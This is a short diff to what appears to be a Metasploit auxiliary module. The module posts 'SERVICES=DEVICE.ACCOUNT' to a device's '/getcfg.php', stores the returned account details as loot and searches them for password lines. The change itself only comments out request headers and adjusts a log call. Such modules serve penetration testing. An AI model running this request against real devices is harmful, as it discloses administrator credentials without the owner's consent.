@@ -45,10 +45,10 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_cgi({
 				'uri' => '/getcfg.php',
 				'method' => 'POST',
-				'headers' => {
-						'Content-Type' => 'application/x-www-form-urlencoded',
-						'Content-Length' => '23',
-					},
+				#'headers' => {
+				#		'Content-Type' => 'application/x-www-form-urlencoded',
+				#		'Content-Length' => '23',
+				#	},
 				'vars_post' => {
 					'SERVICES' => 'DEVICE.ACCOUNT'
 					}
@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
 
 				#store all details as loot -> there is lots of usefull stuff in the response
 				loot = store_loot("account_details.txt","text/plain",rhost, res.body)
-				vprint_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")
+				print_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")
 
 				res.body.each_line do |line|
 					if line =~ /<password>/
